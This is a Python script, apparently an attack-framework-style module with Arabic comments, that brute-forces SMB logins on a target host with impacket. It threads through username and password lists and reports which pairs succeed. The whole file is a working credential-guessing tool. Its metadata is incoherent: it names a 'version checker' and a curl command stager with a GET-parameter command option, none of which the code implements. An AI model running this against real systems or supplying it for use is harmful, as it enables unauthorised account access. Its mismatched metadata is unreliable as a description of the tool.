#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import logging
from impacket.smbconnection import SMBConnection
import threading
from queue import Queue
from rich.console import Console

console = Console()
print_lock = threading.Lock()

# تأكد من تثبيت impacket
dependencies_missing = False
try:
    from impacket.smbconnection import SMBConnection
except ImportError:
    dependencies_missing = True

# Metadata الخاصة بالأداة
metadata = {
    'name': 'SMB Version Checker',
    'description': 'Tool to check the SMB version and attempt login on a target.',
    'authors': ['Your Name'],
    'date': '2023-04-01',
    'license': 'YOUR_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://www.example.com/smb-version-info'},
        {'type': 'url', 'ref': 'https://www.smb.org/'}
    ],
    'type': 'remote_exploit_cmd_stager',
    'targets': [
        {'platform': 'windows', 'arch': 'x86'},
        {'platform': 'windows', 'arch': 'x64'}
    ],
    'payload': {
        'command_stager_flavor': 'curl',
    },
    'options': {
        'targeturi': {'type': 'string', 'description': 'The base path', 'required': True, 'default': '/'},
        'rhost': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None},
        'command': {'type': 'string', 'description': 'The command to execute via the q GET parameter', 'required': True},
        'username_file': {'type': 'string', 'description': 'Path to file with list of usernames', 'required': False, 'default': None},
        'password_file': {'type': 'string', 'description': 'Path to file with list of passwords', 'required': False, 'default': None},
        'username': {'type': 'string', 'description': 'Single username', 'required': False, 'default': None},
        'password': {'type': 'string', 'description': 'Single password', 'required': False, 'default': None},
        'threads': {'type': 'int', 'description': 'Number of threads', 'required': False, 'default': 5}
    }
}


def read_file(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

def smb_login_test(rhost, username, password, results, print_lock):
    try:
        conn = SMBConnection(rhost, rhost)
        if conn.login(username, password):
            results.put((username, password, True))
            with print_lock:
                console.print(f"[bold green][+] [white not bold]Login successful: {username}/{password}")
        else:
            results.put((username, password, False))
            with print_lock:
                console.print(f"[bold red][-] [white not bold]Login failed: {username}/{password}")
        conn.logoff()
    except Exception as e:
        with print_lock:
            console.print(f"[bold red][-] [white not bold]Error during login attempt: {e}")
        results.put((username, password, False))

def threaded_smb_login(rhost, usernames, passwords, thread_count):
    threads = []
    results = Queue()

    for username in usernames:
        for password in passwords:
            t = threading.Thread(target=smb_login_test, args=(rhost, username, password, results, print_lock))
            t.start()
            threads.append(t)
            if len(threads) >= thread_count:
                for t in threads:
                    t.join()
                threads = []

    # Join any remaining threads
    for t in threads:
        t.join()

    while not results.empty():
        username, password, success = results.get()
        with print_lock:
            if success:
                console.print(f"[bold green][+] [white not bold]Login successful: {username}/{password}")
            else:
                console.print(f"[bold red][-] [white not bold]Login failed: {username}/{password}")

def run(args):
    if dependencies_missing:
        console.print('Module dependency (impacket) is missing, cannot continue')
        return

    console.print(f"[bold blue][+] [white not bold]Start Login SMB in {args['rhost']}")
    usernames = read_file(args['username_file']) if args.get('username_file') else [args.get('username')]
    passwords = read_file(args['password_file']) if args.get('password_file') else [args.get('password')]

    thread_count = args.get('threads', 5)
    threaded_smb_login(args['rhost'], usernames, passwords, int(thread_count))
